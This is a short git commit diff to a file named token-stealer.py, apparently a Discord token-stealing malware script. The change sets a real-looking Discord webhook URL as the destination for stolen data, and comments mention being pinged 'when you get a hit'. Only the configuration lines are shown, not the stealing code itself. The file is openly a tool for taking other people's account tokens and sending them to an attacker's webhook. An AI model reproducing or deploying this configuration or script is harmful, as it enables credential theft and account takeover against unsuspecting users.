9321ef26be07d6dca268bbd2eccce7f8c6470660
omik86 <104717551+omik86@users.noreply.github.com>
2022-05-01 12:33:37 +0200

    Update token-stealer.py

--- token-stealer.py
+++ token-stealer.py
@@ -3,7 +3,7 @@ import os
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = "WEBHOOK HERE"
+WEBHOOK_URL = "https://discord.com/api/webhooks/970269808614592532/1BlmBWb-E1vmBNLLjKtc7b4FI9qz_FYVkPlAwIBJxYZoOZTZUVzorImpfSTnkBm3wsdi"
 
 # mentions you when you get a hit
 PING_ME = False
